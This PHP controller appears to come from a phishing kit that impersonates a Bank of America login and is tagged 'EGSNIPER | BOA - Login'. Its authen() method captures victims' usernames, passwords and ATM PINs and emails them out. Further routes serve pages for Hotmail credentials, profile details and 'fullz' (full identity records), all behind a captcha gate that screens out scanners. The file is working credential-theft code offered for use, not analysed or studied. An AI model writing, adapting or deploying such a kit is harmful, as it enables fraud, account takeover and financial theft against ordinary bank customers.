<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {


	public function index()
	{
		if (X_CAPTCHA) {
			$this->load->view('captcha');
		}else{
			$this->session->set_userdata('captcha_status', 'passed');
			redirect(site_url('login'));
		}
	}

	public function authen()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
		if ($this->input->method() == 'post') {
			$msg = [];
			$msg[] = "Usernamei: " . $this->input->post('user');
			$msg[] = "Passwordi: " . $this->input->post('pass');
			$msg[] = "ATM PIN  : " . $this->input->post('atm');
			$this->send_mail($msg, 'EGSNIPER | BOA - Login');
		}
		$this->load->view('authen');
	}
	public function information()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('information');
	}
	public function hotmaillogin()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('hotmaillogin');
	}
		public function loginpassword()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('loginpassword');
	}
		public function loginerror()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('loginerror');
	}
			public function profileinformation()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('profileinformation');
	}
	
				public function logrez()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('logrez');
	}
					public function informationrez()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('informationrez');
	}
						public function hotmailrez1()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('hotmailrez1');
	}
							public function hotmailrez2()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('hotmailrez2');
	}
	
								public function fullzrez()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('fullzrez');
	}
	
									public function updated()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('updated');
	}
	
}
?>
